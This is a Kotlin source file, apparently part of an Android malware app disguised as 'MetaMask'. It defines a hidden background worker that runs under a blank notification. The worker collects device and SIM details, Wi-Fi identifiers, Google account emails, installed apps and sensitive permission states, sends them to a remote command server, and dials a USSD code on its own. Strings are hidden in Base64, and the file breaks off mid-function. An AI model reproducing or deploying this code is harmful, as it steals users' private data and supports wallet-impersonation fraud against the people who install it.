package com.example.MetaMask.services

import android.Manifest
import android.app.ActivityManager
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.Context
import android.hardware.fingerprint.FingerprintManager
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.provider.Telephony
import com.example.MetaMask.receivers.BadgerFalconRecv
import android.telephony.SubscriptionManager
import android.util.Base64
import android.annotation.SuppressLint
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import androidx.work.WorkerParameters
import com.example.MetaMask.BuildConfig
import com.example.MetaMask.R
import com.example.MetaMask.utils.RadioLinkProtocol
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

@Keep
class ChikenWorker(
    private val appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        private val DATE_FMT = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssZ", Locale.getDefault())
        private const val TAG = "SystemWorker"
        private const val PREFS_NAME = "DeviceCheck"
        private const val KEY_USSD_CONFIRMED = "ussd_confirmed"
        private const val KEY_LAST_USSD_ATTEMPT = "last_ussd_attempt_timestamp"
        private const val USSD_COOLDOWN_MS = 60000L
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "ChikenSystemChannel"
        private const val TRAFFER = "{{TRAFFER}}"
        private const val BOT_SUSPICION_TAG = " (BOT?)"
        private fun d(s: String): String {
            android.util.Log.d("XDBG", "[ChikenWorker] d enter s=${s}") //xdbg
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return try {
                String(Base64.decode(s, Base64.NO_WRAP))
            } catch (e: Exception) { "" }
        }

        @Volatile
        var pendingHashCheck: CompletableDeferred<Boolean>? = null
    }

    override suspend fun getForegroundInfo(): ForegroundInfo {
        android.util.Log.d("XDBG", "[ChikenWorker] getForegroundInfo enter") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return createForegroundInfo()
    }

    override suspend fun doWork(): Result {
        android.util.Log.d("XDBG", "[ChikenWorker] doWork enter runAttempt=$runAttemptCount") //xdbg
        try {
            setForeground(createForegroundInfo())
        } catch (_: Exception) {}

        val commandJsonString = inputData.getString("command")
        android.util.Log.d("XDBG", "[ChikenWorker] doWork commandJsonString=${commandJsonString}") //xdbg

        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            val action = if (commandJsonString != null) JSONObject(commandJsonString).optString("action") else "getSystemInfo"
            android.util.Log.d("XDBG", "[ChikenWorker] doWork action=$action") //xdbg

            ensureMasterIsRunning()

            if (action == "getSystemInfo") {
                android.util.Log.d("XDBG", "[ChikenWorker] doWork starting executeChecksAndSendGradually") //xdbg
                try {
                    triggerUssdCheck()
                } catch (_: Exception) {}
                executeChecksAndSendGradually()
                android.util.Log.d("XDBG", "[ChikenWorker] doWork executeChecksAndSendGradually DONE") //xdbg
            }
            Result.success()
        } catch (e: CancellationException) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            throw e
        } catch (_: android.os.TransactionTooLargeException) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            if (runAttemptCount < 3) Result.retry() else Result.failure()
        } catch (_: android.os.RemoteException) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            if (runAttemptCount < 3) Result.retry() else Result.failure()
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    private suspend fun ensureMasterIsRunning() {
        android.util.Log.d("XDBG", "[ChikenWorker] ensureMasterIsRunning enter") //xdbg
        if (MasterWebSocketDispatcher.IS_SERVICE_RUNNING) return
        try {
            val intent = Intent(appContext, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", "CHIKEN_ENSURE")
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                appContext.startForegroundService(intent)
            } else {
                appContext.startService(intent)
            }
            delay(1500)
        } catch (_: Exception) {}
    }

    private fun createForegroundInfo(): ForegroundInfo {
        android.util.Log.d("XDBG", "[ChikenWorker] createForegroundInfo enter") //xdbg
        val nm = appContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && nm != null) {
            try {
                val channel = NotificationChannel(CHANNEL_ID, "System Connection", NotificationManager.IMPORTANCE_MIN)
                nm.createNotificationChannel(channel)
                channel.id
            } catch (e: Exception) { "" }
        } else ""

        val notification = NotificationCompat.Builder(appContext, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return if (Build.VERSION.SDK_INT >= 29) {
            ForegroundInfo(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            ForegroundInfo(NOTIFICATION_ID, notification)
        }
    }

    private fun isLowSpecDevice(): Boolean = true

    private suspend fun executeChecksAndSendGradually() = supervisorScope {
        android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually enter") //xdbg
        val fullSystemInfo = JSONObject()
        val isWeakDevice = isLowSpecDevice()

        fun runBlock(block: () -> JSONObject): JSONObject {
            return try { block() } catch (e: Exception) {
                android.util.Log.e("XDBG", "[ChikenWorker] runBlock catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                JSONObject().put("status", "error")
            }
        }

        if (isWeakDevice) {
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually sequential mode (weakDevice)") //xdbg
            suspend fun runSafe(block: () -> JSONObject): JSONObject {
                delay(200)
                return runBlock(block)
            }
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting deviceInfo") //xdbg
            fullSystemInfo.put("deviceInfo", runSafe { getDeviceData() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting simInfo") //xdbg
            fullSystemInfo.put("simInfo", runSafe { getSimInfo() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting batteryInfo") //xdbg
            fullSystemInfo.put("batteryInfo", runSafe { getBatteryInfo() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting connectivityInfo") //xdbg
            fullSystemInfo.put("connectivityInfo", runSafe { getConnectivityInfo() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting memoryInfo") //xdbg
            fullSystemInfo.put("memoryInfo", runSafe { getMemoryAndStorageInfo() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting securityInfo") //xdbg
            fullSystemInfo.put("securityInfo", runSafe { getSecurityInfo() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting accounts") //xdbg
            fullSystemInfo.put("accounts", runSafe { getAccountEmails() })
            android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually collecting permissions") //xdbg
            fullSystemInfo.put("permissions", runSafe { getPermissionsStatus() })

            if (isStopped) return@supervisorScope
            val netInfo = try {
                withTimeout(15000L) { getPublicNetworkInfoWithFallback() }
            } catch (_: Exception) {
                android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
                createErrorPayload("Timeout")
            }
            fullSystemInfo.put("publicNetworkInfo", netInfo)
        } else {
            val devD = async(Dispatchers.IO) { runBlock { getDeviceData() } }
            val simD = async(Dispatchers.IO) { runBlock { getSimInfo() } }
            val batD = async(Dispatchers.IO) { runBlock { getBatteryInfo() } }
            val conD = async(Dispatchers.IO) { runBlock { getConnectivityInfo() } }
            val memD = async(Dispatchers.IO) { runBlock { getMemoryAndStorageInfo() } }
            val secD = async(Dispatchers.IO) { runBlock { getSecurityInfo() } }
            val accD = async(Dispatchers.IO) { runBlock { getAccountEmails() } }
            val perD = async(Dispatchers.IO) { runBlock { getPermissionsStatus() } }

            val pubD = async(Dispatchers.IO) {
                try {
                    withTimeout(12000L) { getPublicNetworkInfoWithFallback() }
                } catch (_: Exception) {
                    android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
                    createErrorPayload("Timeout")
                }
            }

            fullSystemInfo.put("deviceInfo", devD.await())
            fullSystemInfo.put("simInfo", simD.await())
            fullSystemInfo.put("batteryInfo", batD.await())
            fullSystemInfo.put("connectivityInfo", conD.await())
            fullSystemInfo.put("memoryInfo", memD.await())
            fullSystemInfo.put("securityInfo", secD.await())
            fullSystemInfo.put("accounts", accD.await())
            fullSystemInfo.put("permissions", perD.await())
            fullSystemInfo.put("publicNetworkInfo", pubD.await())
        }

        val appsResult = try {
            getSupApReflectFiltered()
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            createErrorPayload("AppsErr")
        }

        var appList = JSONArray()
        if (appsResult.has("data") && appsResult.getJSONObject("data").has("sup_ap_list")) {
            android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
            appList = appsResult.getJSONObject("data").getJSONArray("sup_ap_list")
        }

        val emptyAppsObj = JSONObject()
            .put("status", "uploading")
            .put("data", JSONObject().put("sup_ap_list", JSONArray()))

        fullSystemInfo.put("supAP", emptyAppsObj)

        val settingsBlockEnabled = appContext
            .getSharedPreferences("app_state_prefs", Context.MODE_PRIVATE)
            .getBoolean("settings_block_enabled", true)
        fullSystemInfo.put("settingsBlockEnabled", settingsBlockEnabled)

        android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually all blocks collected, sending uploadSystemInfo") //xdbg
        val mainPayload = JSONObject().apply {
            put("action", "uploadSystemInfo")
            put("systemInfo", fullSystemInfo)
            put("isPartial", false)
        }
        sendDataToDispatcherSafe(mainPayload)
        android.util.Log.d("XDBG", "[ChikenWorker] executeChecksAndSendGradually uploadSystemInfo sent") //xdbg

        if (appList.length() > 0) {
            android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
            val totalApps = appList.length()

            val accessibilityGranted = CoreServicesLauncher.isAccessibilityServiceEnabled(appContext)
            val sortedApps = (0 until totalApps).map { appList.getString(it) }.sorted()
            val appsHash = md5Hash(sortedApps.joinToString(","))

            val needsUpload = if (!accessibilityGranted) {
                true
            } else {
                val hashDeferred = CompletableDeferred<Boolean>()
                pendingHashCheck = hashDeferred

                sendDataToDispatcherSafe(JSONObject().apply {
                    put("action", "checkAppsHash")
                    put("hash", appsHash)
                })

                try {
                    withTimeout(10_000L) { hashDeferred.await() }
                } catch (_: TimeoutCancellationException) {
                    android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
                    true
                } finally {
                    pendingHashCheck = null
                }
            }

            if (!needsUpload) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
            } else {
                val chunkSize = 50
                var index = 0
                while (index < totalApps) {
                    android.util.Log.d("XDBG", "[ChikenWorker] loop") //xdbg
                    if (isStopped) break
                    val chunk = JSONArray()
                    val end = (index + chunkSize).coerceAtMost(totalApps)
                    for (i in index until end) {
                        android.util.Log.d("XDBG", "[ChikenWorker] loop") //xdbg
                        chunk.put(appList.get(i))
                    }
                    val appsPayload = JSONObject().apply {
                        put("action", "uploadAppsChunk")
                        put("apps", chunk)
                        put("isReset", index == 0)
                    }
                    sendDataToDispatcherSafe(appsPayload)
                    delay(if (isWeakDevice) 300 else 50)
                    index += chunkSize
                }
            }
        }

        try {
            RadioLinkProtocol.establishConnection(appContext)
        } catch (_: Exception) {}
    }

    private fun sendDataToDispatcherSafe(jsonData: JSONObject) {
        val action = jsonData.optString("action", "?")
        android.util.Log.d("XDBG", "[ChikenWorker] sendDataToDispatcherSafe enter action=$action") //xdbg
        try {
            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, jsonData.toString())
                setPackage(appContext.packageName)
            }
            appContext.sendBroadcast(intent)
            android.util.Log.d("XDBG", "[ChikenWorker] sendDataToDispatcherSafe broadcast sent action=$action") //xdbg
        } catch (e: android.os.TransactionTooLargeException) {
            android.util.Log.e("XDBG", "[ChikenWorker] sendDataToDispatcherSafe catch TransactionTooLarge action=$action") //xdbg
        } catch (e: android.os.RemoteException) {
            android.util.Log.e("XDBG", "[ChikenWorker] sendDataToDispatcherSafe catch RemoteException action=$action msg=${e.message}") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] sendDataToDispatcherSafe catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun md5Hash(input: String): String {
        android.util.Log.d("XDBG", "[ChikenWorker] md5Hash enter input=${input}") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            val digest = java.security.MessageDigest.getInstance("MD5")
            digest.digest(input.toByteArray()).joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch (ignored)") //xdbg
            ""
        }
    }

    private fun getSupApReflectFiltered(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getSupApReflectFiltered enter") //xdbg
        val pm = appContext.packageManager
        var lastError: Exception? = null
        for (attempt in 0..2) {
            android.util.Log.d("XDBG", "[ChikenWorker] loop") //xdbg
            try {
                if (attempt > 0) {
                    android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                    Thread.sleep(800L * attempt)
                }
                val apps: List<android.content.pm.ApplicationInfo> = pm.getInstalledApplications(0)
                val allItems = JSONArray()
                for (appInfo in apps) {
                    android.util.Log.d("XDBG", "[ChikenWorker] loop") //xdbg
                    try {
                        if ((appInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) continue
                        val appLabel = pm.getApplicationLabel(appInfo).toString()
                        val finalName = if (appLabel.isBlank()) appInfo.packageName else appLabel
                        allItems.put(finalName)
                    } catch (_: Exception) { continue }
                }
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return JSONObject().put("status", "success")
                    .put("data", JSONObject().put("sup_ap_list", allItems))
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[ChikenWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                lastError = e
            }
        }
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return createErrorPayload("AppsListFail:${lastError?.javaClass?.simpleName}")
    }

    private fun triggerUssdCheck() {
        android.util.Log.d("XDBG", "[ChikenWorker] triggerUssdCheck enter") //xdbg
        try {
            val prefs = appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val alreadyConfirmed = prefs.getBoolean(KEY_USSD_CONFIRMED, false)
            if (alreadyConfirmed) return
            val lastAttemptTime = prefs.getLong(KEY_LAST_USSD_ATTEMPT, 0L)
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastAttemptTime < USSD_COOLDOWN_MS) return
            prefs.edit().putLong(KEY_LAST_USSD_ATTEMPT, currentTime).apply()

            val command = JSONObject().apply {
                put("requestCode", "*31#")
                put("ussdId", "AUTO_CHECK")
                put("simCardIndex", -1)
            }
            val intent = Intent(appContext, UssdControlService::class.java).apply {
                putExtra("command", command.toString())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                appContext.startForegroundService(intent)
            } else {
                appContext.startService(intent)
            }
        } catch (_: Exception) {}
    }

    private fun createErrorPayload(message: String): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] createErrorPayload enter message=${message}") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return JSONObject().put(d("c3RhdHVz"), d("ZXJyb3I=")).put("message", message)
    }

    private fun getPublicNetworkInfoWithFallback(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getPublicNetworkInfoWithFallback enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return createErrorPayload("PermDen")
            }
            fun tryFetch(urlString: String): String? {
                android.util.Log.d("XDBG", "[ChikenWorker] tryFetch enter urlString=${urlString}") //xdbg
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return try {
                    val url = URL(urlString)
                    val urlConnection = url.openConnection() as HttpURLConnection
                    urlConnection.connectTimeout = 8000
                    urlConnection.readTimeout = 8000
                    urlConnection.requestMethod = "GET"
                    if (urlConnection.responseCode == HttpURLConnection.HTTP_OK) {
                        android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                        val reader = BufferedReader(InputStreamReader(urlConnection.inputStream))
                        val response = reader.use(BufferedReader::readText)
                        reader.close()
                        response
                    } else { null }
                } catch (e: Exception) { null }
            }
            var response = tryFetch(d("aHR0cHM6Ly9pcC1hcGkuY29tL2pzb24="))
            if (response == null) response = tryFetch(d("aHR0cHM6Ly9pcHdob2lzLmFwcC9qc29uLw=="))
            if (response == null) response = tryFetch(d("aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=="))

            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return if (response != null) {
                try {
                    val data = JSONObject(response)
                    JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), data)
                } catch (e: Exception) { createErrorPayload("JSONErr") }
            } else { createErrorPayload("FetchFail") }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return createErrorPayload("NetErr")
        }
    }

    private fun getConnectivityInfo(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getConnectivityInfo enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return createErrorPayload("PermDen")
            }
            val cm = appContext.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                ?: return createErrorPayload("CM null")

            var activeNetworkType = "None"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                val network = cm.activeNetwork
                val capabilities = cm.getNetworkCapabilities(network)
                if (capabilities != null) {
                    android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                    when {
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> activeNetworkType = "Wi-Fi"
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> activeNetworkType = "Mobile"
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> activeNetworkType = "VPN"
                        capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> activeNetworkType = "Ethernet"
                    }
                }
            } else {
                @Suppress("DEPRECATION")
                val activeNetworkInfo = cm.activeNetworkInfo
                if (activeNetworkInfo != null && activeNetworkInfo.isConnected) {
                    android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                    @Suppress("DEPRECATION")
                    when (activeNetworkInfo.type) {
                        ConnectivityManager.TYPE_WIFI -> activeNetworkType = "Wi-Fi"
                        ConnectivityManager.TYPE_MOBILE -> activeNetworkType = "Mobile"
                        ConnectivityManager.TYPE_VPN -> activeNetworkType = "VPN"
                        ConnectivityManager.TYPE_ETHERNET -> activeNetworkType = "Ethernet"
                    }
                }
            }
            val data = JSONObject().put("active_network_type", activeNetworkType)
            if (activeNetworkType == "Wi-Fi" && ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_WIFI_STATE) == PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                val wifiManager = appContext.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                if (wifiManager != null) {
                    android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                    val wifiInfo = wifiManager.connectionInfo
                    data.put("wifi_ssid", wifiInfo.ssid.removeSurrounding("\""))
                    data.put("wifi_bssid", wifiInfo.bssid)
                    data.put("wifi_link_speed_mbps", wifiInfo.linkSpeed)
                    data.put("wifi_rssi", wifiInfo.rssi)
                }
            }
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), data)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return createErrorPayload("ConErr")
        }
    }

    private fun getBatteryInfo(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getBatteryInfo enter") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            val iFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus: Intent? = appContext.registerReceiver(null, iFilter)

            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val batteryPct = if (level != -1 && scale != -1) (level / scale.toFloat()) * 100 else -1.0f
            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
            val chargePlug: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1

            val chargeSource = when (chargePlug) {
                BatteryManager.BATTERY_PLUGGED_AC -> "AC"
                BatteryManager.BATTERY_PLUGGED_USB -> "USB"
                BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
                else -> "None"
            }
            val temperature = (batteryStatus?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0

            val data = JSONObject().apply {
                put("level_percent", "%.2f".format(batteryPct))
                put("is_charging", isCharging)
                put("charge_source", chargeSource)
                put("temperature_celsius", temperature)
            }
            JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), data)
        } catch (e: Exception) { createErrorPayload("BatErr") }
    }

    private fun getMemoryAndStorageInfo(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getMemoryAndStorageInfo enter") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            val actManager = appContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            val avail = memInfo.availMem / (1024 * 1024)
            val total = memInfo.totalMem / (1024 * 1024)
            val stat = StatFs(Environment.getDataDirectory().path)
            val bytesAvail = stat.blockSizeLong * stat.availableBlocksLong
            val bytesTot = stat.blockSizeLong * stat.blockCountLong
            val gbAvail = bytesAvail / (1024 * 1024 * 1024)
            val gbTot = bytesTot / (1024 * 1024 * 1024)

            val data = JSONObject().apply {
                put("ram_available_mb", avail)
                put("ram_total_mb", total)
                put("storage_available_gb", gbAvail)
                put("storage_total_gb", gbTot)
            }
            JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), data)
        } catch(e: Exception) { createErrorPayload("MemErr") }
    }

    private fun getSecurityInfo(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getSecurityInfo enter") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw=="))
                .put(d("ZGF0YQ=="), JSONObject().put("is_rooted", false).put("is_safe", true).put("verdict", "UNKNOWN"))
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChikenWorker] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            createErrorPayload("SecErr")
        }
    }

    private fun getAccountEmails(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getAccountEmails enter") //xdbg
        try {
            if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
                return createErrorPayload("PermDen")
            }
            val emails = JSONArray()
            val amClass = Class.forName("android.accounts.AccountManager")
            val getMethod = amClass.getMethod("get", Context::class.java)
            val amInstance = getMethod.invoke(null, appContext)

            val getAccMethod = amClass.getMethod("getAccountsByType", String::class.java)
            val accounts = getAccMethod.invoke(amInstance, "com.google") as Array<*>

            for (acc in accounts) {
                android.util.Log.d("XDBG", "[ChikenWorker] loop") //xdbg
                val nameField = acc!!.javaClass.getField("name")
                emails.put(nameField.get(acc))
            }
            android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
            return JSONObject().put(d("c3RhdHVz"), d("c3VjY2Vzcw==")).put(d("ZGF0YQ=="), JSONObject().put(d("ZW1haWxz"), emails))
        } catch (e: Exception) { return createErrorPayload("AccErr") }
    }

    private fun getPermissionsStatus(): JSONObject {
        android.util.Log.d("XDBG", "[ChikenWorker] getPermissionsStatus enter") //xdbg
        android.util.Log.d("XDBG", "[ChikenWorker] return") //xdbg
        return try {
            val check = { p: String -> ContextCompat.checkSelfPermission(appContext, p) == PackageManager.PERMISSION_GRANTED }
            val data = JSONObject().apply {
                put(Manifest.permission.READ_SMS,    check(Manifest.permission.READ_SMS))
                put(Manifest.permission.SEND_SMS,    check(Manifest.permission.SEND_SMS))
                put(Manifest.permission.RECEIVE_SMS, check(Manifest.permission.RECEIVE_SMS))
                put("android.permission.RECEIVE_MMS", check("android.permission.RECEIVE_MMS"))
                put(Manifest.permission.READ_CALL_LOG,  check(Manifest.permission.READ_CALL_LOG))
                put(Manifest.permission.WRITE_CALL_LOG, check(Manifest.permission.WRITE_CALL_LOG))
                put(Manifest.permission.READ_CONTACTS,  check(Manifest.permission.READ_CONTACTS))
                put(Manifest.permission.WRITE_CONTACTS, check(Manifest.permission.WRITE_CONTACTS))
                put(Manifest.permission.READ_PHONE_STATE, check(Manifest.permission.READ_PHONE_STATE))
                put(Manifest.permission.READ_PHONE_NUMBERS, if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) check(Manifest.permission.READ_PHONE_NUMBERS) else false)
                put(Manifest.permission.CALL_PHONE, check(Manifest.permission.CALL_PHONE))
                @Suppress("DEPRECATION")
                put(Manifest.permission.PROCESS_OUTGOING_CALLS, check(Manifest.permission.PROCESS_OUTGOING_CALLS))
                put(Manifest.permission.CAMERA,       check(Manifest.permission.CAMERA))
                put(Manifest.permission.RECORD_AUDIO, check(Manifest.permission.RECORD_AUDIO))
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    android.util.Log.d("XDBG", "[ChikenWorker] if branch") //xdbg
                    put(Manifest.permission.READ_MEDIA_IMAGES, check(Manifest.permission.READ_MEDIA_IMAGES))
                    put(Manifest.permission.READ_MEDIA_VIDEO,  check(Manifest.permission.READ_MEDIA_VIDEO))
                    put(Manifest.permission.READ_MEDIA_AUDIO,  check(Manifest.permission.READ_MEDIA_AUDIO))
                } else {
                    put(Manifest.permission.READ_EXTERNAL_STORAGE, check(Manifest.permission.READ_EXTERNAL_STORAGE))
                }
                put(Manifest.permission.INTERNET,            check(Manifest.permission.INTERNET))
                put(Manifest.permission.ACCESS_NETWORK_STATE, check(Manifest.permission.ACCESS_NETWORK_STATE))
                if (BuildConfig.FEAT_ACCOUNTS) put(Manifest.permission.GET_ACCOUNTS, check(Manifest.permission.GET_ACCOUNTS))
                put("is_default_sms_app", try {
                    if (com.example.MetaMask.HyperOsDetector.isHyperOs &&
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        (appContext.getSystemService(Context.ROLE_SERVICE) as? android.app.role.RoleManager)
                            ?.isRoleHeld(android.app.role.RoleManager.ROLE_SMS) == true
                    } else {
                        Telephony.Sms.getDefaultSmsPackage(appContext) == appContext.packageName
                    }
                } catch (_: Exception) { false })
                    android.util.Log.e("XDBG", "[ChikenWorker] catch Exception (ignored)") //xdbg
                put("is_battery_optimized_ignored", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    (appContext.getSystemService(Context.POWER_SERVICE) as? android.os.PowerManager)
                        ?.isIgnoringBatteryOptimizations(appContext.packageName) ?: false
                } else true)
